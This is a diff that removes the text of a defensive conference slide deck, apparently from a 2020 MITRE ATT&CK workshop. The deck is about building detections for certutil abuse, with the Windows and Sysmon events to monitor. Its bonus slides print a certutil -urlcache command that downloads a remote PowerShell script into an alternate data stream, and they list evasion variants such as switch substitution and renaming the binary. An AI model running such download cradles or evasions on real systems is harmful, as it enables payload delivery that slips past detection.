@@ -1,127 +1,0 @@
-@olafhartong
-
-Detection resilience, sniffing out the Duke from the Bear
-Olaf Hartong | Defensive Specialist | FalconForce
-MITRE ATT&CK Workshop 2020
-
-Who I am
-
-Olaf Hartong
-Defensive Specialist
-FalconForce
-
-15+ years in Info Security Consulted at banks, telco's, educational institutions and governmental organizations · Built and/or led Security Operations Centers · Threat hunting, IR and Compromise assessments · SOC Maturity transformations Former documentary photographer Father of 2 boys "I like warm hugs"
-@olafhartong github.com/olafhartong olafhartong.nl olaf@falconforce.nl
-
-@olafhartong
-
-TLP; WHITE
-
-Resilient Detections
-Avoid getting duped by nifty attackers
-
-Resilient detections
-Should... · ..be able to resist evasions and small changes to TTPs · ..ideally capture technique rather than specific command
-· specific rules an still be used to detect specific cases · ..retain a low False Positive tolerance, this is often a trade-off · ..only use IOCs if there is no other way · ..be tested!
-@olafhartong
-
-TTPs Tools Network / Host Artifacts Domain Names
-IP Addresses
-Hash values
-
-Decoding the duke and the bear
-What did the bear do in the woods?
-
-Why Dukes and bears?
-
-@olafhartong
-
-https://urbandictionary.com
-
-Dukes and bears, graphed
-Pivot from the most active, known/attributed, groups. The graph shows the relation in ATT&CK between the Actor > Techniques While they all have their own specific techniques, there are also quite a few that overlap
-@olafhartong
-
-created in Bloodhound, thanks to SadProcessor
-
-Select some target techniques
-· T1085 - Rundll32 · T1084 ­ Windows Management
-Instrumentation Event Subscription · T1027 ­ Obfuscated Files or Information
-@olafhartong
-
-Who else is using these techniques?
-@olafhartong
-
-T1027 ­ Obfuscated Files or Information
-@olafhartong
-
-T1140 ­ Deobfuscate/Decode Files or Information
-@olafhartong
-
-T1140 ­ Deobfuscate/Decode Files or Information
-@olafhartong
-
-Microsoft Documentation­ Certutil
-Many many options
-RtlDecompressBuffer
-
-@olafhartong
-
-https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
-
-Resources ­ Certutil
-@olafhartong
-
-https://lolbas-project.github.io https://github.com/Neo23x0/sigma
-https://atomicredteam.io/
-
-Resilient detections ­ CertUtil ­ Focus: Endpoint
-
-Sigma Rules · Process Creation · Proxy
-LolBas · Process Creation · File Creation · Network Connection
-Atomic Red Team · Process Creation · File Creation · Network Connection
-
-My expectations
-Security 4656: A handle to an object was requested. Security 4688: A new process has been created Security 5156: The Windows Filtering Platform has allowed a connection Security 5158: The Windows Filtering Platform has permitted a bind to a local port
-Sysmon 1: Process Creation Sysmon 3: Network connection Sysmon 11: File created Sysmon 22: DNS Query
-
-@olafhartong
-
-Resilient detections ­ CertUtil - Encode
-@olafhartong
-
-Resilient detections ­ CertUtil
-@olafhartong
-
-Resilient detections ­ CertUtil - Encode
-Lets replace - with / What if we put the argument in double quotes? Or somewhere randomly in the argument?
-@olafhartong
-
-Resilient detections ­ CertUtil ­ Technique 1 - Considerations
-certutil.exe -encode somefile.ext encodedfile.ext · -encode or /encode works · -f or /f is optional, forces overwrite of the encoded file · deal with obfuscation, preferably in separate rules · certutil can be renamed
-@olafhartong
-
-Thank you!
-bonus slides if I was fast enough :D
-Olaf Hartong @olafhartong github.com/olafhartong olaf@falconforce.nl
-@olafhartong
-
-Resilient detections ­ CertUtil - URLCache
-@olafhartong
-
-Resilient detections ­ CertUtil - URLCache
-@olafhartong
-
-Resilient detections ­ CertUtil
-@olafhartong
-
-Resilient detections ­ CertUtil ­ Technique 2 - Considerations
-certutil.exe -urlcache -split -f https://hawkinslab.net/possible_malicious.ps1 c:\temp:ttt
-· -urlcache or /urlcache · http:// can also be https, smb or a variable · -split or /split is optional, might be useful for IDS/IPS evasion · -f or /f is optional, only forces overwrite · a : in the last block without a \ next to it could indicate alternate file stream attempt · certutil can be renamed
-@olafhartong
-
-Thank you! (really)
-Olaf Hartong @olafhartong github.com/olafhartong olaf@falconforce.nl
-@olafhartong
-
-
